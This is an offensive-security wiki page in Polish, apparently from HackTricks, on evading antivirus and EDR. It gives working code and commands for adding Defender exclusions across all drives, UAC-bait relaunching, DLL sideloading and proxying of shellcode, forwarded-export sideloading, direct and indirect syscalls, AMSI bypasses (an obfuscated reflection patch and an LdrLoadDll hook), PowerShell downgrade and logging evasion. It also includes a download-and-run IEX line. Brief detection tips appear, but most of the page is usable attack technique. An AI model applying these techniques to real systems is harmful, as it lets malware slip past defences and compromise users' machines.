# Obejście antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie, które zatrzymuje działanie Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie, które zatrzymuje działanie Windows Defendera, podszywając się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulowaniem Defenderem

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podwyższenie uprawnień**, a dopiero potem unieszkodliwiają Defendera. Przebieg jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, używając polecenia `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie ten sam program, używając czasownika `RunAs`, aby wywołać oczekiwany monit zgody UAC, zachowując oryginalny wiersz polecenia.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące wszystkie litery dysków

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoadera maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw kończy działanie procesu nadzorującego GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, przez co skanowanie obejmuje profile wszystkich użytkowników, katalogi systemowe i dyski wymienne:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload zapisany gdziekolwiek na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest działaniem na przyszłość — atakujący zachowują sobie możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego ingerowania w Defendera.
- Wszystkie zmiany są zapisywane w `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal zgłaszają, że „antywirus jest aktywny”, mimo że ochrona w czasie rzeczywistym nie skanuje tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodologia omijania AV**

Obecnie programy antywirusowe stosują różne metody sprawdzania, czy plik jest złośliwy: wykrywanie statyczne, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR-ów — analizę behawioralną.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub sekwencji bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itd.). Oznacza to, że korzystanie ze znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na ominięcie tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, program antywirusowy nie będzie w stanie go wykryć, ale potrzebny będzie jakiś loader, który odszyfruje program i uruchomi go w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby ominąć program antywirusowy, ale w zależności od tego, co próbujesz poddać obfuskacji, może to być czasochłonne.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istniały znane sygnatury złośliwego oprogramowania, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie, czy Windows Defender wykrywa plik statycznie, jest użycie [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi znaków lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam tę [playlistę na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznym metodom omijania AV.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu pliku binarnego przez program antywirusowy w sandboxie i obserwowaniu złośliwych działań (np. prób odszyfrowania i odczytania haseł z przeglądarki, wykonania minidumpa LSASS itd.). Ten etap może być nieco trudniejszy, ale oto kilka sposobów na ominięcie sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. Programy antywirusowe mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie uśpienie może zakłócić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie — zależnie od sposobu jego implementacji.
- **Sprawdzanie zasobów komputera** Sandboxy zwykle dysponują bardzo ograniczonymi zasobami (np. < 2 GB RAM), bo w przeciwnym razie mogłyby spowalniać komputer użytkownika. Można też wykazać się kreatywnością, na przykład sprawdzając temperaturę procesora, a nawet prędkość wentylatorów — nie wszystko będzie obsługiwane przez sandbox.
- **Kontrole specyficzne dla komputera** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z podaną nazwą. Jeśli się nie zgadza, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH, więc przed detonacją możesz sprawdzić nazwę komputera w swoim malware. Jeśli jest to HAL9TH, oznacza to, że znajdujesz się w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Oto kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących omijania sandboxów.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? A może istnieje inny, mniej znany projekt, który również zrzuca LSASS?

Prawdopodobnie lepsza będzie ta druga opcja. Weźmy mimikatz za przykład — to prawdopodobnie jeden z najczęściej oznaczanych przez AV i EDR-ów fragmentów malware, jeśli nie ten najczęściej oznaczany. Sam projekt jest świetny, ale omijanie AV przy jego użyciu to koszmar, więc po prostu poszukaj alternatyw, które pomogą osiągnąć zamierzony cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze i, proszę, naprawdę **NIE WYSYŁAJ PLIKÓW DO VIRUSTOTAL**, jeśli chcesz długofalowo unikać wykrycia. Jeśli chcesz sprawdzić, czy konkretny AV wykrywa Twój payload, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXE a DLL

Jeśli to możliwe, zawsze **w pierwszej kolejności wybieraj DLL-e, aby uniknąć wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zazwyczaj **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach jest to bardzo prosty sposób na uniknięcie wykrycia (oczywiście pod warunkiem, że Twój payload może działać jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma współczynnik wykrywalności 4/26 na antiscan.me, podczas gdy payload EXE ma współczynnik 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Porównanie na antiscan.me zwykłego payloadu EXE z Havoc ze zwykłą biblioteką DLL z Havoc</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, które pozwalają znacznie skuteczniej ukrywać pliki DLL.

## DLL Sideloading i Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Programy podatne na DLL Sideloading można wyszukiwać za pomocą [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Zdecydowanie zalecam samodzielne **wyszukiwanie programów podatnych na DLL Hijack/Sideload**, ponieważ ta technika jest dość stealth, jeśli zostanie prawidłowo zastosowana. Jeśli jednak użyjesz publicznie znanych programów podatnych na DLL Sideload, możesz łatwo zostać wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której program oczekuje, nie spowoduje załadowania payloadu, ponieważ program oczekuje określonych funkcji w tej bibliotece. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) do oryginalnej biblioteki DLL. Dzięki temu zachowana zostaje funkcjonalność programu, a payload może zostać uruchomiony.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto wykonane przeze mnie kroki:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL o zmienionej nazwie.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [nagranie VOD S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [film ippseca](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omówionych zagadnieniach.

### Nadużywanie eksportów przekazywanych (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które w rzeczywistości są „forwarderami”: zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader Windows:

- Ładuje `TargetDll`, jeśli nie jest jeszcze załadowany
- Rozwiązuje z niego `TargetFunc`

Najważniejsze zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest udostępniany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, stosowana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego przekazywanie.

Umożliwia to pośrednią technikę sideloading: znajdź podpisaną DLL, która eksportuje funkcję przekazywaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść tę podpisaną DLL obok kontrolowanej przez atakującego DLL o nazwie dokładnie takiej jak przekazywany moduł docelowy. Gdy wywołany zostanie przekazywany eksport, loader rozwiąże przekazanie i załaduje Twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwana zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna implementacja `DllMain` wystarczy, aby uruchomić kod; nie musisz implementować funkcji przekazywanej dalej, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom przekazywanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje bibliotekę side-by-side `keyiso.dll` (podpisaną)
- Podczas rozpoznawania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader ładuje następnie `NCRYPTPROV.dll` z `C:\test` i wykonuje jej `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na przekierowanych eksportach, których docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Przekierowane eksporty można wyliczyć za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz wykaz forwarderów w Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane biblioteki DLL ze ścieżek innych niż systemowe, a następnie ładujące biblioteki DLL spoza KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dla łańcuchów procesów/modułów, takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogu systemowego → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i blokuj jednoczesny zapis i wykonywanie w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Za pomocą Freeze możesz w ukryty sposób załadować i uruchomić swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dziś, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu. Jeśli to możliwe, łącz kilka technik evasion.

## Direct/Indirect Syscalls i rozpoznawanie SSN (SysWhispers4)

EDR-y często umieszczają **inline hooks w trybie użytkownika** na stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby syscall **direct** lub **indirect**, które ładują prawidłowy **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania przechwyconego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: emituje instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (nie odwołuje się do eksportu `ntdll`).
- **Indirect**: wykonuje skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, dzięki czemu przejście do jądra wygląda, jakby pochodziło z `ntdll` (przydatne do omijania heurystyk); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unika umieszczania na dysku statycznej sekwencji opcode `0F 05`; wyszukuje sekwencję syscall w czasie działania.

**Strategie rozpoznawania SSN odporne na hooki:**
- **FreshyCalls (sortowanie według VA)**: określa SSN przez sortowanie stubów syscall według adresów wirtualnych zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: mapuje czystą kopię `\KnownDlls\ntdll.dll`, odczytuje SSN z jej sekcji `.text`, a następnie ją odmapowuje (omija wszystkie hooki w pamięci).
- **RecycledGate**: łączy wnioskowanie o SSN na podstawie sortowania według VA z walidacją opcode, gdy stub jest czysty; jeśli stub jest przechwycony, przechodzi do wnioskowania na podstawie VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w czasie działania, bez parsowania przechwyconych bajtów.

Przykładowe użycie SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)”. Początkowo AV potrafił skanować wyłącznie **pliki na dysku**, więc jeśli udało się uruchomić payloady **bezpośrednio w pamięci**, AV nie mógł temu zapobiec, ponieważ nie miał wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi składnikami systemu Windows:

- Kontrola konta użytkownika (UAC; podwyższanie uprawnień plików EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra VBA w pakiecie Office

Umożliwia rozwiązaniom antywirusowym analizowanie zachowania skryptów, udostępniając ich zawartość w postaci niezaszyfrowanej i niezakamuflowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że na początku dodaje `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Ponadto, począwszy od **.NET 4.8**, kod C# również jest sprawdzany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do uruchamiania kodu w pamięci. Dlatego do uruchamiania kodu w pamięci zaleca się używanie niższych wersji .NET (takich jak 4.7.2 lub starszych), jeśli chcesz uniknąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie w oparciu o wykrywanie statyczne, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak deobfuskować skrypty, nawet jeśli mają wiele warstw, więc obfuscation może być złym rozwiązaniem — zależnie od sposobu jej zastosowania. Przez to uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, więc wszystko zależy od tego, jak wiele elementów zostało oflagowanych.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo manipulować tym mechanizmem, nawet działając jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że skanowanie nie zostanie uruchomione dla bieżącego procesu. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec powszechniejszemu stosowaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczył jeden wiersz kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Oczywiście ten wiersz został wykryty przez samo AMSI, więc trzeba go zmodyfikować, aby skorzystać z tej techniki.

Oto zmodyfikowany bypass AMSI z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten wpis prawdopodobnie zostanie oznaczony po publikacji, więc jeśli planujesz pozostać niewykrytym, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami, które zwracają kod E_INVALIDARG. Dzięki temu wynik właściwego skanowania wyniesie 0, co zostanie zinterpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik omijania AMSI w powershell. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repozytorium**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidna, niezależna od języka metoda obejścia polega na umieszczeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skanowania.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript i niestandardowych loaderach (we wszystkich przypadkach, które w przeciwnym razie załadowałyby AMSI).
- Warto połączyć tę metodę z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć śladów w postaci długich wierszy poleceń.
- Zaobserwowano jej użycie przez loadery uruchamiane za pośrednictwem LOLBins (np. `regsvr32` wywołujące `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do ominięcia AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do ominięcia AMSI, który unika sygnatur dzięki losowo generowanej funkcji zdefiniowanej przez użytkownika, zmiennym i wyrażeniom znakowym, a także losowo zmienia wielkość liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** lub **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Rejestrowanie PowerShell

Rejestrowanie PowerShell to funkcja umożliwiająca zapisywanie wszystkich poleceń PowerShell wykonywanych w systemie. Może to być przydatne do celów audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć rejestrowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz Transkrypcję PowerShell i rejestrowanie modułów**: W tym celu możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (takie podejście wykorzystuje `powerpick` z Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji opiera się na szyfrowaniu danych, które zwiększa entropię pliku binarnego, ułatwiając wykrycie go przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko określonych sekcji kodu, które zawierają wrażliwe dane lub powinny pozostać ukryte.

### Dekodowanie plików binarnych .NET chronionych przez ConfuserEx

Podczas analizowania malware wykorzystującego ConfuserEx 2 (lub jego komercyjne forki) często napotyka się kilka warstw ochrony, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca niemal oryginalny kod IL**, który można następnie zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usunięcie ochrony przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze *modułu* (`<Module>.cctor`). Modyfikuje też sumę kontrolną PE, przez co każda zmiana powoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby znaleźć zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czysty zestaw.
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Dane wyjściowe zawierają 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (fork de4dot obsługujący ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
